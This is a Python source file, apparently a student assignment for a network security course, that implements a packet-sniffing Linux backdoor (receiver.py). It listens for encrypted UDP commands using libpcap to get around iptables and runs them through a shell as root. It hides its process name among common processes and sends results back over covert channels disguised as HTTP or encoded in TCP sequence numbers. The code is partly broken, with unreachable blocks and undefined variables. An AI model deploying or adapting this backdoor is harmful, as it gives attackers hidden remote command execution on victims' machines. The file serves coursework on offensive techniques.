#!/usr/bin/env python3

"""
----------------------------------------------------------------------------------------------------
COMP 8505 BTech Network Security & Applications Development
Assignment 3:
    - To become familiar with packet sniffing backdoors and to implement Linux backdoors.
Student:
    - Hung Yu (Angus) Lin, A01034410, Set 7J
----------------------------------------------------------------------------------------------------
receiver.py
    - Contains a packet sniffing backdoor that listens for port-knocking on 3 ports in a specific order.
    - If port-knocking successful, decrypt the payload from the last packet and execute the command and.
      save the output. Then start a TCP connection to the sender and return the payload.
----------------------------------------------------------------------------------------------------
"""

import setproctitle
import socket as sock
# from socket import *
from _thread import *
from os import setuid, setgid

import encryption
import textwrap
import subprocess
from scapy.all import *
from scapy.layers.inet import *
# Set scapy to use libpcap library to circumvent iptables rules.
from scapy.all import conf
conf.use_pcap = True

LOG_PATH = "log.txt"
CONFIGURATION_PATH = "configuration.txt"
# host_address = ""


class Configuration:
    def __init__(self):
        self.receiver_address = ''
        self.sender_address = ''
        self.receiver_port = 0
        self.sender_port = 0
        self.port_knock_password_base = ''
        self.port_knock_password_seq_num = ''
        self.delimiter = ''

        with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
            fp = [line.rstrip('\n') for line in file]
            for line in fp:
                if line.isspace() or line.startswith('#'):
                    continue

                config_data = line.split('=')
                if config_data[0] == 'receiver_address':
                    self.receiver_address = config_data[1]
                elif config_data[0] == 'sender_address':
                    self.sender_address = config_data[1]
                elif config_data[0] == 'sender_port':
                    if config_data[1].isdigit():
                        self.sender_port = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                elif config_data[0] == 'receiver_port':
                    if config_data[1].isdigit():
                        self.receiver_port = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                elif config_data[0] == 'port_knock_password_base':
                    self.port_knock_password_base = config_data[1]
                elif config_data[0] == 'port_knock_password_seq_num':
                    self.port_knock_password_seq_num = config_data[1]
                elif config_data[0] == 'delimiter':
                    self.delimiter = config_data[1]

    def update_port_knock_password_seq_num(self):
        self.port_knock_password_seq_num = str(int(self.port_knock_password_seq_num) + 1)

        with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
            data = file.readlines()

        for idx, a in enumerate(data):
            if "port_knock_password_seq_num" in a:
                data[idx] = "port_knock_password_seq_num=" + str(self.port_knock_password_seq_num) + "\n"

        with open(file=CONFIGURATION_PATH, mode='w', encoding='utf-8') as file:
            file.writelines(data)


# Initialize configuration class.
config = Configuration()
# Initialize packet_list for reassembling packets in correct order.
packet_list = {}

#
# def read_configuration():
#     """
#     Reads configuration file.
#     :return: list (config vars)
#     """
#
#     configuration = {
#         'receiver_address': '',
#         'sender_address': '',
#         'receiver_port1': 0,
#         'receiver_port2': 0,
#         'receiver_port3': 0,
#         'sender_port': 0,
#         'port_knock_auth': '',
#     }
#
#     with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
#         fp = [line.rstrip('\n') for line in file]
#         for line in fp:
#             if line.isspace() or line.startswith('#'):
#                 continue
#
#             config_data = line.split('=')
#             if config_data[0] in configuration:
#                 if config_data[0] in ('receiver_address', 'sender_address', 'port_knock_auth'):
#                     configuration[config_data[0]] = config_data[1]
#                 elif config_data[0] in ('receiver_port1', 'receiver_port2', 'receiver_port3', 'sender_port'):
#                     data = config_data[1]
#                     if data.isdigit():
#                         configuration[config_data[0]] = int(config_data[1])
#                     else:
#                         print("Invalid configuration, ports must be integers.")
#                         exit()
#                 else:
#                     print("Invalid configuration, unsupported variable detected.")
#                     exit()
#
#     return configuration


def run_commands(command):
    """
    Executes a shell command, then save and returns the output.
    :param command: str of shell command
    :return: str of output
    """
    # result = subprocess.run(['ls', '-l'], capture_output=True, text=True).stdout
    try:
        result2 = subprocess.run(command, capture_output=True, text=True, shell=True).stdout
    except Exception:
        result2 = "Failed to execute shell command. Shell command invalid or unknown on receiver system."
    print(result2)
    return result2


def hide_process_name():
    # Change process name to the highest duplicate process on system.
    try:
        # Gets last column of ps (process status), the process names.
        cmd1 = "ps -e -o command"
        # Gets each unique (process name), and number of duplicates
        cmd2 = "uniq -c"
        # Sort by ascending order of first field/column (num of dups).
        cmd3 = "sort -nr --key=1,1"
        # Keep the first line of output (highest dups)
        cmd4 = "head -n 1"
        # Removes the first column (# of dups)
        cmd5 = "awk '{$1=\"\"}1'"
        # Removes the leading space delimiter after cutting out first column
        cmd6 = "awk '{$1=$1}1"
        # ps -e -o command | uniq -c | sort -nr --key=1,1 | head -n 1 | awk '{$1=""}1' | awk '{$1=$1}1'
        get_highest_dup_process_name = "ps -e -o command | uniq -c | sort -nr --key=1,1 | head -n 1 | awk '{$1=\"\"}1' | awk '{$1=$1}1' "
        output = run_commands(get_highest_dup_process_name)
        setproctitle.setproctitle(output)
    except Exception:
        # If failed, default to /bin/bash as process name.
        setproctitle.setproctitle("/bin/bash")


def start_backdoor():
    """
    Initialize the packet sniffing backdoor. Elevate privileges, sets up configurations, and starts sniff.
    :return: None
    """
    print("Starting Receiver.")


    # Elevate privileges.
    setuid(0)
    setgid(0)

    hide_process_name()

    # Generate encryption key if needed. Ensure both sender and receiver have same key.
    encryption.generate_key()

    # Read Configuration
    # Read Configuration
    global config
    config = Configuration()
    receiver_addr = config.receiver_address
    port1 = config.receiver_port
    port2 = config.receiver_port
    port3 = config.receiver_port
    sender_addr = config.sender_address
    sender_port = config.sender_port
    delimiter = config.delimiter

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    # Start sniffing, callback function to process each packet.
    sniff(prn=process_sniff_pkt, filter=f"udp dst port {config.receiver_port}", store=0)
    # sniff_port_knock(receiver_addr, port1, port2, port3, sender_addr, sender_port, port_knock_auth)


def process_sniff_pkt(pkt):
    """
    Callback function that processes each packet sniffed for valid backdoor sequence.
    UDP packets must port knock port 1-3 in config file in the right order, while also containing
    the auth_string as payload specified in config file.
    If a valid port knock is detected, decrypt command from payload to execute.
    :param pkt: scapy packet
    :return: None
    """
    global config
    global packet_list
    packet_list = {}
    packet_start = "$$!!"

    ip_dst = pkt.payload.dst

    if ip_dst != config.receiver_address:
        return

    # dst_port = pkt.payload.payload.dport
    check_data = bytes(pkt.payload.payload.payload)
    try:
        encoded_input = check_data.decode("utf-8")
    except UnicodeDecodeError:
        # print("Unauthorized Non-unicode payload for backdoor.")
        return

    data = check_data.decode("utf-8")

    # if type(check_data) == bytes:
    #     print(f"Payload: {check_data.decode('utf-8')}")
    #     data = check_data.decode('utf-8')

    if not data.startswith(packet_start):
        return

    # slice out packet_start
    s_data = data[4:]
    decrypt_cmd = ""
    commands = []
    try:
        print(f"Encrypted Cmd: {s_data}")
        decrypt_cmd = encryption.decrypt(s_data.encode('utf-8')).decode('utf-8')
        print(f"Cmd: {decrypt_cmd}")
        commands = decrypt_cmd.split(config.delimiter)
    except:
        print(f"Decryption Failed:\n{decrypt_cmd}")

    print(commands)
    one_time_password = config.port_knock_password_base + config.port_knock_password_seq_num
    packet_password = commands[0]
    order = commands[1]
    print(len(commands))
    if len(commands) > 2:
        instruction = commands[2]
    if len(commands) > 3:
        instruction_input = commands[3]

    if one_time_password != packet_password:
        print(f"Password Don't Match!\n{one_time_password}\n{packet_password}")
        return
    print(f"Password Matched!\n{one_time_password}\n{packet_password}")

    if order == "1/1":
        instruction = commands[2]
        if instruction == "1":
            print(instruction)
        elif instruction == "2":
            print(instruction)
        elif instruction == "3":
            instruction_input = commands[3]
            print(instruction)
            print(instruction_input)
            result = run_commands(instruction_input)
            # encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
            # send_command_output(encrypted_data, address, sender_port)
        elif instruction == "4":
            instruction_input = commands[3]
            print(instruction)
            print(instruction_input)
        elif instruction == "5":
            instruction_input = commands[3]
            print(instruction)
            print(instruction_input)
        elif instruction == "6":
            print(instruction)
        elif instruction == "7":
            instruction_input = commands[3]
            print(instruction)
            print(instruction_input)
        elif instruction == "8":
            print(instruction)
        elif instruction == "9":
            print(instruction)
        else:
            print(f"WARNING, invalid instruction: {instruction}.")

    return

    # Instruction only stored in first packet
    # If multi-packet, save to packet_list dictionary style 1:data, 2:data

    if knock_order == 0:
        if dst_port == port1 and data == port_knock_auth:
            print(f"First knock valid")
            knock_order = 1
        else:
            print(f"First knock Failed")
            knock_order = 0
    elif knock_order == 1:
        if dst_port == port2 and data == port_knock_auth:
            print(f"Second knock valid")
            knock_order = 2
        else:
            print(f"Second Knock Failed.")
            knock_order = 0
    elif knock_order == 2:
        final_payload = data.split('|')
        auth_string = final_payload[0]
        command = final_payload[1]
        address = pkt.payload.src
        if dst_port == port3 and auth_string == port_knock_auth:
            print(f"Third knock valid")
            print(f"Encrypted Cmd: {command}")
            decrypt_cmd = encryption.decrypt(command.encode('utf-8')).decode('utf-8')
            print(f"Cmd: {decrypt_cmd}")
            result = run_commands(decrypt_cmd)
            encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
            send_command_output(encrypted_data, address, sender_port)
            knock_order = 0
        else:
            print(f"Third Knock Failed.")
            knock_order = 0

    # print(f"IP Dest: {ip_dst}")
    # print(f"Dst Port: {dst_port}")
    # print(data)


def send_command_output(data, address, port):
    """
    Create TCP socket connection to specified address/port and send the string data.
    :param data: str
    :param address: dst IP
    :param port: dst port
    :return: None
    """

    dst = address
    sport = 7000
    dport = port
    inital_seq_num = 1000

    # Add short delay ensuring attacker sniff is ready.
    time.sleep(0.5)

    # copy fake easy 3 way handshake for scapy
    # create HTTP REST PORT request, with data encrypted and hidden as covert channel
    # store packet order curr 1/100 as cookies
    # store file name/extension as cookies too
    # store password as cookie too??? maybe not for now
    # if file too big, break into parts, and send as payload
    # can prob encrypt whole file, read as binary then send, recombine easily with cookie info, then decrypt

    # IPv4 Socket connection to receiver.
    with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as my_sock:
        my_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
        my_sock.connect((address, port))
        my_sock.sendall(data.encode("utf-8"))


def send_message(message, instruction, filename=""):

    address = config.sender_address
    # sport = 7000
    # dport = port
    dport = config.sender_port
    # inital_seq_num = 1000

    # 3-way-handshake
    syn = IP(dst=address) / TCP(dport=dport, flags='S')
    syn_ack = sr1(syn, verbose=0, timeout=5)


    if syn_ack is None:
        print("3-way-handshake failed. No response from receiver.")
        return
    ack = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
    send(ack, verbose=0)

    # message = "hello"
    # request = f"POST / HTTP/1.1\r\n\r\n" + message
    request = f"POST / HTTP/1.1\r\n" \
              f"Host: 192.168.1.195\r\n" \
              f"User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\r\n" \
              f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" \
              f"Accept-Language: en-CA,en-US;q=0.7,en;q=0.3\r\n" \
              f"Accept-Encoding: gzip, deflate\r\n" \
              f"Cookie:\r\n" \
              f"session_type={instruction},session_name={filename},session=0000000001\r\n" \
              f"Connection: keep-alive\r\n" \
              f"Upgrade-Insecure-Requests: 1\r\n" \
              f"Content-Type: text/html; charset=utf-8\r\n" \
              f"Content-Length: {len(message)}\r\n\r\n" + message

    print(f"len_request: {len(request)}")

    if len(request) <= 1400:
        http_request = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='PA', seq=syn_ack[TCP].ack,
                                             ack=syn_ack[TCP].seq + 1) / request
        send(http_request, verbose=0)
    else:
        num_parts = str(len(textwrap.wrap(request, 1400))).zfill(10)
        new_request = f"POST / HTTP/1.1\r\n" \
                  f"Host: {config.sender_address}\r\n" \
                  f"User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\r\n" \
                  f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" \
                  f"Accept-Language: en-CA,en-US;q=0.7,en;q=0.3\r\n" \
                  f"Accept-Encoding: gzip, deflate\r\n" \
                  f"Cookie:\r\n" \
                  f"session_type={instruction},session_name={filename},session={num_parts}\r\n" \
                  f"Connection: keep-alive\r\n" \
                  f"Upgrade-Insecure-Requests: 1\r\n" \
                  f"Content-Type: text/html; charset=utf-8\r\n" \
                  f"Content-Length: {len(message)}\r\n\r\n" + message

        parts = textwrap.wrap(new_request, 1400)
        for idx, part in enumerate(parts):
            payload = part
            if idx > 0:
                packet_order = f"{config.delimiter}{idx + 1}".encode('utf-8')
                payload += packet_order

            http_post = IP(dst=address) / UDP(sport=syn_ack[TCP].dport, dport=dport) / Raw(load=payload)
            send(http_post, verbose=0)
            # message = one_time_password + packet_order + delimiter + command
            # encrypt_msg = packet_start + encryption.encrypt(message.encode('utf-8')).decode('utf-8')
            # encrypt_len = len(encrypt_msg.encode('utf-8'))
            # if encrypt_len > 508:
            #     print("Warning, payload in port knock packet exceeding 508 bytes, may not decrypt if payload "
            #           "is truncated.")
            #     port_knock2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
            #     send(port_knock2, verbose=0)
        print("Warning, payload in port knock packet exceeding 500 bytes, may not decrypt if payload truncated.")







    http_request = IP(dst="192.168.1.182") / TCP(sport=6000, dport=80, flags='PA', seq=1,
                                                 ack=1) / request
    send(http_request, verbose=0)

    http_request = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='PA', seq=syn_ack[TCP].ack,
                                         ack=syn_ack[TCP].seq + 1) / request
    send(http_request, verbose=0)

    # Starting to send data.
    cur_seq = syn_ack.ack
    cur_ack = syn_ack.seq + 1

    data = encryption.encrypt(message.encode("ascii")).decode("ascii")
    # data = message
    current_seq = 1000
    for c in data:
        if current_seq > 2000000000:
            current_seq = 0
        current_seq += 1000
        stega_seq = current_seq + ord(c)

        tcp_pushack = ip / TCP(sport=sport, dport=dport, flags='PA', seq=stega_seq, ack=cur_ack)
        send(tcp_pushack, verbose=0)
        cur_seq = stega_seq
        # cur_ack = tcp_ack.seq
        # cur_seq += len(data)
        # RESPONSE = sr1(ip / PUSHACK / Raw(load=data))

    # Closing TCP connection
    # start_new_thread(wait_for_fin_ack, (address, ip, sport, dport))
    tcp_fin = ip / TCP(sport=sport, dport=dport, flags="FA", seq=cur_seq, ack=cur_ack)
    # tcp_finack = sr1(tcp_fin)
    send(tcp_fin, verbose=0)
    # tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=tcp_finack.ack, ack=tcp_finack.seq + 1)
    tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=cur_seq, ack=cur_ack + 1)
    send(tcp_lastack, verbose=0)
    print("Send Complete.")


# def wait_for_fin_ack(address, ip, sport, dport):
#     print("sniffing")
#     # tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
#     tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
#     print("sniffed!")
#     print(tcp_finack)
#     ack = tcp_finack[0].payload.payload.ack
#     seq = tcp_finack[0].payload.payload.seq
#     print(f"ack {ack}")
#     print(f"seq {seq}")
#     tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=ack, ack=seq + 1)
#     send(tcp_lastack)

    # IPv4 Socket connection to receiver.
    # with socket(AF_INET, SOCK_STREAM) as sock:
    #     sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    #     sock.connect((address, port))
    #     sock.sendall(message.encode("utf-8"))
    #     print(f"Receiver: \tIP = {address}, Port = {port}")
    #     print(f"Message Sent: \t{message}")



if __name__ == "__main__":
    try:
        start_backdoor()
    except KeyboardInterrupt as e:
        print("Receiver Shutdown")
        exit()


